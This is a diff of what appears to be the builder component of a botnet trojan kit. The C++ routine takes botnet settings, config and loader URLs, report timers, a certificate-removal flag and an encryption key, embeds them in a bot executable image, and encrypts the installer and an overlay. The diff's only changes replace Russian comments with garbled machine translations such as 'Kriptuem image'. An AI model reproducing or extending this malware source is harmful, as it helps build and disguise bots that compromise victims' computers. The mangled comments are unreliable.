@@ -38,11 +38,9 @@ void BuildBot::uninit(void)
 
 }
 
-/*
-  Произволно заполняем базовую конфигурацию, исходя из даты сборки.
+/*В В Proizvolno fill in the basic configuration, based on the date of the assembly.
 
-  OUT baseConfig - конфигурация.
-*/
+В В OUT baseConfig - configuration.*/
 static __declspec(noinline) void generateSecretHash(BASECONFIG *baseConfig)
 {
   DWORD seek = Crypt::crc32Hash((LPBYTE)BO_BUILDTIME, sizeof(BO_BUILDTIME) - sizeof(WCHAR));
@@ -61,14 +59,14 @@ bool BuildBot::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR de
   writeOutput(output, Languages::get(Languages::builder_bot_proc_config));
   baseConfig.flags = 0;
 
-  //Открываем раздел.
+  //Open section.
   if((rootNode = Config0::_GetVar(NULL, config, NULL, "staticconfig")) == NULL)
   {
     writeOutputError(output, Languages::get(Languages::builder_staticconfig_not_founded));
     return false;
   }
   
-  //Ботнет.
+  //Botnet.
   baseConfig.defaultBotnet[0] = 0;
   if((currentNode = Config0::_GetVar(rootNode, NULL, "botnet", NULL)) && currentNode->bValuesCount > 1 && *currentNode->pValues[1] != 0)
   {
@@ -91,25 +89,25 @@ bool BuildBot::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR de
   }
   writeOutput(output, L"botnet=%s", baseConfig.defaultBotnet);
 
-  //Задержка загрузки конфигурации.
+  //Delay loading configuration.
   currentNode = Config0::_GetVar(rootNode, NULL, "timer_config", NULL);
   baseConfig.delayConfig  = ((currentNode && currentNode->bValuesCount > 1 ? Str::_ToInt32A(currentNode->pValues[1], NULL) : 60) & 0xFFFF) << 16;
   baseConfig.delayConfig |= ((currentNode && currentNode->bValuesCount > 2 ? Str::_ToInt32A(currentNode->pValues[2], NULL) : 10) & 0xFFFF);
   writeOutput(output, L"timer_config=%umin, %umin", HIWORD(baseConfig.delayConfig), LOWORD(baseConfig.delayConfig));
   
-  //Задержка загрузки отчетов.
+  //Delay load of reports.
   currentNode = Config0::_GetVar(rootNode, NULL, "timer_logs", NULL);
   baseConfig.delayReport  = ((currentNode && currentNode->bValuesCount > 1 ? Str::_ToInt32A(currentNode->pValues[1], NULL) : 5) & 0xFFFF) << 16;
   baseConfig.delayReport |= ((currentNode && currentNode->bValuesCount > 2 ? Str::_ToInt32A(currentNode->pValues[2], NULL) : 5) & 0xFFFF);
   writeOutput(output, L"timer_logs=%umin, %umin", HIWORD(baseConfig.delayReport), LOWORD(baseConfig.delayReport));
 
-  //Задержка загрузки статистики.
+  //Delay download statistics.
   currentNode = Config0::_GetVar(rootNode, NULL, "timer_stats", NULL);
   baseConfig.delayStats  = ((currentNode && currentNode->bValuesCount > 1 ? Str::_ToInt32A(currentNode->pValues[1], NULL) : 5) & 0xFFFF) << 16;
   baseConfig.delayStats |= ((currentNode && currentNode->bValuesCount > 2 ? Str::_ToInt32A(currentNode->pValues[2], NULL) : 5) & 0xFFFF);
   writeOutput(output, L"timer_stats=%umin, %umin", HIWORD(baseConfig.delayStats), LOWORD(baseConfig.delayStats));
 
-  //Файл конфигурации.
+  //Configuration file.
   {
     DWORD urlSize;
     if((currentNode = Config0::_GetVar(rootNode, NULL, "url_config", NULL)) == NULL || currentNode->bValuesCount < 2 || (urlSize = Str::_LengthA(currentNode->pValues[1])) == 0)
@@ -138,7 +136,7 @@ bool BuildBot::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR de
     Mem::free(defaultConfig);
   }
 
-  //Флаги.
+  //Flags.
   {
     currentNode = Config0::_GetVar(rootNode, NULL, "remove_certs", NULL);
     if(currentNode == NULL || currentNode->bValuesCount < 2 || Str::_ToInt32A(currentNode->pValues[1], NULL) != 0)baseConfig.flags |= BCF_REMOVE_CERTS;
@@ -149,7 +147,7 @@ bool BuildBot::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR de
     writeOutput(output, L"disable_tcpserver=%u", (baseConfig.flags & BCF_DISABLE_TCPSERVER) ? 1 : 0);
   }
   
-  //Ключ шифрования.
+  //Encryption key.
   {
     DWORD keySize; 
     if((currentNode = Config0::_GetVar(rootNode, NULL, "encryption_key", NULL)) == NULL || currentNode->bValuesCount < 2 || (keySize = Str::_LengthA(currentNode->pValues[1])) < 1)
@@ -161,12 +159,12 @@ bool BuildBot::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR de
     writeOutput(output, L"encryption_key=OK");
   }
 
-  //////////////////////////////////////////////////////////////////////////////////////////////////
-  // Криптуем образ.
-  //////////////////////////////////////////////////////////////////////////////////////////////////
+  //////////////////////////////////////////////////// //////////////////////////////////////////////
+  //В Kriptuem image.
+  //////////////////////////////////////////////////// //////////////////////////////////////////////
   writeOutput(output, Languages::get(Languages::builder_bot_proc_creating));
 
-  //Парсим образ бота.
+  //Parsi image bot.
   PeImage::PEDATA originalPe;
   if(PeImage::_createFromMemory(&originalPe, (LPBYTE)_client32, sizeof(_client32), false) == NULL)
   {
@@ -174,7 +172,7 @@ bool BuildBot::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR de
     return false;
   }
   
-  //Добавляем конфигурацию.
+  //Add configuration.
   {
     WORD sectionIndex;
     DWORD sectionOffset = PeImage::_rvaToRsa(&originalPe, CLIENT32_VA_BASECONFIG - originalPe.ntHeader.p32->OptionalHeader.ImageBase, &sectionIndex);
@@ -190,7 +188,7 @@ bool BuildBot::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR de
     Mem::_copy(&originalPe.sectionsRawData[sectionIndex][sectionOffset], &baseConfig, sizeof(BASECONFIG));
   }
 
-  //Шифруем инсталлятор
+  //Encrypt installer
   INSTALLDATA installData;
   {
     WORD installIndex;
@@ -210,7 +208,7 @@ bool BuildBot::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR de
     installData.updateSize  = BaseOverlay::_encryptFunction(&originalPe.sectionsRawData[updateIndex][updateOffset], installData.xorKey);
   }
 
-  //Процесс криптования.
+  //The process of encryption.
   LPBYTE destRawPe    = NULL;
   DWORD destRawPeSize = 0;
   {
@@ -218,7 +216,7 @@ bool BuildBot::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR de
 
     PeImage::_freeImage(&originalPe);
 
-    //Узнаем размер образа
+    //Know the size of the image
     if(destRawPe == NULL)
     {
       writeOutputError(output, Languages::get(Languages::error_not_enough_memory));
@@ -231,7 +229,7 @@ bool BuildBot::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR de
       writeOutput(output, info);
     }
 
-    //Добавляем оверлей.
+    //Adding an overlay.
     {
       Crypt::RC4KEY keyOfOverlay;
       Crypt::_rc4Init(&baseConfig, sizeof(BASECONFIG), &keyOfOverlay);
@@ -248,13 +246,13 @@ bool BuildBot::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR de
     }
   }
 
-  //Пишим образ.
+  //Pishim image.
   {
     WCHAR outputFile[MAX_PATH];
     LPWSTR file = NULL;
     LPSTR bot;
     
-    //Получаем имя файла.
+    //Obtain the file name.
     if((rootNode = Config0::_GetVar(NULL, config, NULL, "dynamicconfig")) && (currentNode = Config0::_GetVar(rootNode, NULL, "url_loader", NULL)) &&
        currentNode->bValuesCount > 1 && (bot = CWA(shlwapi, PathFindFileNameA)(currentNode->pValues[1])) && *bot != 0)
     {
